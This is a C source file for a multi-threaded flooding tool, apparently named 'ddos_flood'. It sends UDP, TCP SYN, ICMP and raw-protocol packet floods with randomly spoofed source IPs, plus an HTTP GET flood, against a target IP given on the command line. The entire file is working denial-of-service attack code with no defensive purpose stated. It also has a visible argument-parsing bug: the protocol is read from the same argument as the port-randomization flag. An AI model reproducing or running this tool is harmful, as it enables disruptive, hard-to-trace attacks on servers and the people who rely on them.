#include <stdio.h>
#include <string.h>
#include <stdlib.h>
#include <unistd.h>
#include <pthread.h>
#include <arpa/inet.h>
#include <netinet/ip.h>
#include <netinet/udp.h>
#include <netinet/tcp.h>
#include <time.h>
#include <sys/socket.h>
#include <sys/types.h>

// Constants for packet sizes and defaults
#define PACKET_DATA_SIZE 1024  // Data payload size (excluding headers)
#define DEFAULT_RATE 100000    // Packets/sec per thread
#define DEFAULT_THREADS 4
#define IP_HDR_SIZE sizeof(struct iphdr)
#define UDP_HDR_SIZE sizeof(struct udphdr)
#define TCP_HDR_SIZE 20        // Standard TCP header without options
#define ICMP_HDR_SIZE 8        // Standard ICMP echo header
#define HTTP_REQUEST_SIZE 512  // Buffer for HTTP request

// Enum for supported protocols
enum Protocol {
    PROTO_UDP,
    PROTO_TCP,
    PROTO_ICMP,
    PROTO_HTTP,
    PROTO_RAW
};

// Pseudo header for UDP/TCP checksum
struct pseudo_header {
    u_int32_t source_address;
    u_int32_t dest_address;
    u_int8_t placeholder;
    u_int8_t protocol;
    u_int16_t length;
};

// ICMP header struct
struct icmphdr {
    u_int8_t type;
    u_int8_t code;
    u_int16_t checksum;
    u_int16_t id;
    u_int16_t sequence;
};

// Checksum calculation function
unsigned short checksum(void* data, int length) {
    unsigned short* buf = data;
    unsigned int sum = 0;
    unsigned short result;

    while (length > 1) {
        sum += *buf++;
        length -= 2;
    }
    if (length == 1) {
        sum += *(unsigned char*)buf;
    }
    sum = (sum >> 16) + (sum & 0xFFFF);
    sum += (sum >> 16);
    result = ~sum;
    return result;
}

// Structure for thread arguments
typedef struct {
    char* target_ip;
    int target_port;
    int rate;
    int randomize_payload;
    int randomize_src_port;
    enum Protocol protocol;
    int proto_num;  // For RAW protocol
} ThreadArgs;

// HTTP flood function (no spoofing, uses regular TCP sockets)
void* http_flood(void* arg) {
    ThreadArgs* args = (ThreadArgs*)arg;
    int port = (args->target_port == 0) ? 80 : args->target_port;
    struct sockaddr_in target;
    char request[HTTP_REQUEST_SIZE];
    unsigned long packet_count = 0;

    // Set up target address
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(port);
    inet_pton(AF_INET, args->target_ip, &target.sin_addr);

    // Build HTTP GET request
    snprintf(request, sizeof(request),
             "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: Mozilla/5.0\r\nConnection: close\r\n\r\n",
             args->target_ip);

    int delay = 1000000 / args->rate;  // Microseconds

    printf("Starting HTTP flood to %s:%d\n", args->target_ip, port);

    while (1) {
        int sock = socket(AF_INET, SOCK_STREAM, 0);
        if (sock < 0) {
            printf("Packet %lu: HTTP socket creation failed\n", ++packet_count);
            continue;
        }

        int status = connect(sock, (struct sockaddr*)&target, sizeof(target));
        if (status == 0) {
            if (send(sock, request, strlen(request), 0) >= 0) {
                printf("Packet %lu: Sent HTTP request to %s:%d, Status: Success\n", 
                       ++packet_count, args->target_ip, port);
            } else {
                printf("Packet %lu: Failed to send HTTP request to %s:%d, Status: Failed\n", 
                       ++packet_count, args->target_ip, port);
            }
        } else {
            printf("Packet %lu: Connection to %s:%d failed, Status: Failed\n", 
                   ++packet_count, args->target_ip, port);
        }
        close(sock);
        usleep(delay);
    }

    return NULL;
}

// Raw packet flood function (with spoofing for UDP/TCP/ICMP/RAW)
void* raw_flood(void* arg) {
    ThreadArgs* args = (ThreadArgs*)arg;
    int sock;
    // Create raw socket
    if ((sock = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) < 0) {
        perror("Raw socket creation failed");
        return NULL;
    }

    // Enable IP header inclusion
    int one = 1;
    if (setsockopt(sock, IPPROTO_IP, IP_HDRINCL, &one, sizeof(one)) < 0) {
        perror("Setsockopt IP_HDRINCL failed");
        close(sock);
        return NULL;
    }

    // Set up target address
    struct sockaddr_in target;
    memset(&target, 0, sizeof(target));
    target.sin_family = AF_INET;
    target.sin_port = htons(args->target_port);
    inet_pton(AF_INET, args->target_ip, &target.sin_addr);

    // Determine header sizes based on protocol
    int trans_hdr_size = 0;
    switch (args->protocol) {
        case PROTO_UDP: trans_hdr_size = UDP_HDR_SIZE; break;
        case PROTO_TCP: trans_hdr_size = TCP_HDR_SIZE; break;
        case PROTO_ICMP: trans_hdr_size = ICMP_HDR_SIZE; break;
        case PROTO_RAW: trans_hdr_size = 0; break;
        default: break;
    }
    int full_packet_size = IP_HDR_SIZE + trans_hdr_size + PACKET_DATA_SIZE;
    char packet[full_packet_size];
    struct iphdr* iph = (struct iphdr*)packet;
    void* trans_hdr = packet + IP_HDR_SIZE;
    char* data = packet + IP_HDR_SIZE + trans_hdr_size;

    // Seed random number generator per thread
    srand(time(NULL) + (unsigned long)pthread_self());

    // Precompute fixed IP header fields
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = htons(full_packet_size);
    iph->id = htons(rand() % 65535);
    iph->frag_off = 0;
    iph->ttl = 64;
    iph->daddr = target.sin_addr.s_addr;

    // Set IP protocol
    switch (args->protocol) {
        case PROTO_UDP: iph->protocol = IPPROTO_UDP; break;
        case PROTO_TCP: iph->protocol = IPPROTO_TCP; break;
        case PROTO_ICMP: iph->protocol = IPPROTO_ICMP; break;
        case PROTO_RAW: iph->protocol = args->proto_num; break;
        default: iph->protocol = IPPROTO_UDP; // Fallback to UDP
    }

    int delay = 1000000 / args->rate;  // Microseconds
    u_int16_t icmp_seq = 0;
    unsigned long packet_count = 0;

    printf("Starting %s flood to %s:%d\n", 
           args->protocol == PROTO_UDP ? "UDP" : 
           args->protocol == PROTO_TCP ? "TCP" : 
           args->protocol == PROTO_ICMP ? "ICMP" : "RAW",
           args->target_ip, args->target_port);

    while (1) {
        // Random source IP
        char src_ip[16];
        snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d",
                 rand() % 256, rand() % 256, rand() % 256, rand() % 256);
        iph->saddr = inet_addr(src_ip);

        // Random IP ID per packet
        iph->id = htons(rand() % 65535);

        // Protocol-specific header setup
        switch (args->protocol) {
            case PROTO_UDP: {
                struct udphdr* udph = (struct udphdr*)trans_hdr;
                udph->dest = target.sin_port;
                udph->len = htons(UDP_HDR_SIZE + PACKET_DATA_SIZE);
                udph->source = args->randomize_src_port ? htons(rand() % 65535 + 1) : htons(12345);
                break;
            }
            case PROTO_TCP: {
                struct tcphdr* tcph = (struct tcphdr*)trans_hdr;
                tcph->dest = target.sin_port;
                tcph->seq = htonl(rand());
                tcph->ack_seq = 0;
                tcph->doff = 5;
                tcph->syn = 1;
                tcph->window = htons(64240);
                tcph->urg_ptr = 0;
                tcph->source = args->randomize_src_port ? htons(rand() % 65535 + 1) : htons(12345);
                break;
            }
            case PROTO_ICMP: {
                struct icmphdr* icmph = (struct icmphdr*)trans_hdr;
                icmph->type = 8;
                icmph->code = 0;
                icmph->id = htons(rand() % 65535);
                icmph->sequence = htons(icmp_seq++);
                icmph->checksum = 0;
                break;
            }
            case PROTO_RAW: {
                break;
            }
            default: break;
        }

        // Randomize payload if enabled
        if (args->randomize_payload) {
            for (int i = 0; i < PACKET_DATA_SIZE; i++) {
                data[i] = rand() % 256;
            }
        } else {
            memset(data, 'A', PACKET_DATA_SIZE);
        }

        // IP checksum
        iph->check = 0;
        iph->check = checksum(iph, IP_HDR_SIZE);

        // Protocol-specific checksum
        switch (args->protocol) {
            case PROTO_UDP:
            case PROTO_TCP: {
                struct pseudo_header psh;
                psh.source_address = iph->saddr;
                psh.dest_address = iph->daddr;
                psh.placeholder = 0;
                psh.protocol = iph->protocol;
                psh.length = htons(trans_hdr_size + PACKET_DATA_SIZE);

                int pseudogram_size = sizeof(struct pseudo_header) + trans_hdr_size + PACKET_DATA_SIZE;
                char pseudogram[pseudogram_size];
                memcpy(pseudogram, &psh, sizeof(struct pseudo_header));
                memcpy(pseudogram + sizeof(struct pseudo_header), trans_hdr, trans_hdr_size + PACKET_DATA_SIZE);

                if (args->protocol == PROTO_UDP) {
                    ((struct udphdr*)trans_hdr)->check = 0;
                    ((struct udphdr*)trans_hdr)->check = checksum(pseudogram, pseudogram_size);
                } else {
                    ((struct tcphdr*)trans_hdr)->check = 0;
                    ((struct tcphdr*)trans_hdr)->check = checksum(pseudogram, pseudogram_size);
                }
                break;
            }
            case PROTO_ICMP: {
                struct icmphdr* icmph = (struct icmphdr*)trans_hdr;
                icmph->checksum = 0;
                icmph->checksum = checksum(trans_hdr, ICMP_HDR_SIZE + PACKET_DATA_SIZE);
                break;
            }
            case PROTO_RAW: {
                break;
            }
            default: break;
        }

        // Send packet
        int status = sendto(sock, packet, full_packet_size, 0, (struct sockaddr*)&target, sizeof(target));
        if (status >= 0) {
            printf("Packet %lu: Sent %s packet from %s to %s:%d, Status: Success\n",
                   ++packet_count, 
                   args->protocol == PROTO_UDP ? "UDP" : 
                   args->protocol == PROTO_TCP ? "TCP" : 
                   args->protocol == PROTO_ICMP ? "ICMP" : "RAW",
                   src_ip, args->target_ip, args->target_port);
        } else {
            printf("Packet %lu: Failed to send %s packet from %s to %s:%d, Status: Failed\n",
                   ++packet_count, 
                   args->protocol == PROTO_UDP ? "UDP" : 
                   args->protocol == PROTO_TCP ? "TCP" : 
                   args->protocol == PROTO_ICMP ? "ICMP" : "RAW",
                   src_ip, args->target_ip, args->target_port);
        }

        usleep(delay);
    }

    close(sock);
    return NULL;
}

int main(int argc, char* argv[]) {
    // Validate command-line arguments
    if (argc < 3) {
        printf("Usage: %s <target_ip> <port> [rate_per_thread] [threads] [randomize_payload 0/1] [randomize_src_port 0/1] [protocol udp/tcp/icmp/http/raw] [proto_num for raw]\n", argv[0]);
        printf("Example: sudo ./ddos_flood 192.168.1.100 80 1000 4 1 1 http\n");
        printf("Note: Requires root privileges for raw sockets. HTTP uses TCP sockets (no spoofing). Port ignored for ICMP/raw (use 0). TCP uses SYN flood.\n");
        return 1;
    }

    // Parse arguments
    char* target_ip = argv[1];
    int target_port = atoi(argv[2]);
    int rate = argc >= 4 ? atoi(argv[3]) : DEFAULT_RATE;
    int threads = argc >= 5 ? atoi(argv[4]) : DEFAULT_THREADS;
    int randomize_payload = argc >= 6 ? atoi(argv[5]) : 1;
    int randomize_src_port = argc >= 7 ? atoi(argv[6]) : 1;
    char* proto_str = argc >= 7 ? argv[6] : "udp";
    int proto_num = argc >= 8 ? atoi(argv[7]) : 0;

    // Debug: Print raw protocol string
    printf("DEBUG: Raw protocol string: '%s'\n", proto_str);

    // Map protocol string to enum
    enum Protocol protocol;
    if (strcasecmp(proto_str, "udp") == 0) {
        protocol = PROTO_UDP;
        printf("DEBUG: Protocol set to UDP\n");
    } else if (strcasecmp(proto_str, "tcp") == 0) {
        protocol = PROTO_TCP;
        printf("DEBUG: Protocol set to TCP\n");
    } else if (strcasecmp(proto_str, "icmp") == 0) {
        protocol = PROTO_ICMP;
        printf("DEBUG: Protocol set to ICMP\n");
    } else if (strcasecmp(proto_str, "http") == 0) {
        protocol = PROTO_HTTP;
        printf("DEBUG: Protocol set to HTTP\n");
    } else if (strcasecmp(proto_str, "raw") == 0) {
        protocol = PROTO_RAW;
        printf("DEBUG: Protocol set to RAW\n");
        if (proto_num == 0) {
            printf("Error: proto_num required for raw protocol (e.g., 255).\n");
            return 1;
        }
    } else {
        printf("Error: Invalid protocol '%s'. Use: udp, tcp, icmp, http, raw\n", proto_str);
        return 1;
    }

    // Adjust port for HTTP/ICMP/RAW
    if (protocol == PROTO_HTTP && target_port == 0) target_port = 80;
    if (protocol == PROTO_ICMP || protocol == PROTO_RAW) target_port = 0;

    // Print configuration
    printf("Launching flood on %s:%d — Protocol: %s, Rate: %d pps/thread, Threads: %d, Random Payload: %d, Random Src Port: %d\n",
           target_ip, target_port, proto_str, rate, threads, randomize_payload, randomize_src_port);
    if (protocol == PROTO_RAW) printf("Raw Protocol Number: %d\n", proto_num);
    printf("Features: IP spoofing (except HTTP), multi-protocol support (UDP/TCP/ICMP/HTTP/RAW).\n");

    // Create threads
    pthread_t tid[threads];
    for (int i = 0; i < threads; i++) {
        ThreadArgs* args = malloc(sizeof(ThreadArgs));
        args->target_ip = target_ip;
        args->target_port = target_port;
        args->rate = rate;
        args->randomize_payload = randomize_payload;
        args->randomize_src_port = randomize_src_port;
        args->protocol = protocol;
        args->proto_num = proto_num;
        printf("DEBUG: Creating thread %d with protocol %s\n", i, 
               protocol == PROTO_HTTP ? "HTTP" : 
               protocol == PROTO_UDP ? "UDP" : 
               protocol == PROTO_TCP ? "TCP" : 
               protocol == PROTO_ICMP ? "ICMP" : "RAW");
        pthread_create(&tid[i], NULL, (protocol == PROTO_HTTP ? http_flood : raw_flood), (void*)args);
    }

    // Wait for threads to finish (runs until interrupted)
    for (int i = 0; i < threads; i++) {
        pthread_join(tid[i], NULL);
    }

    return 0;
}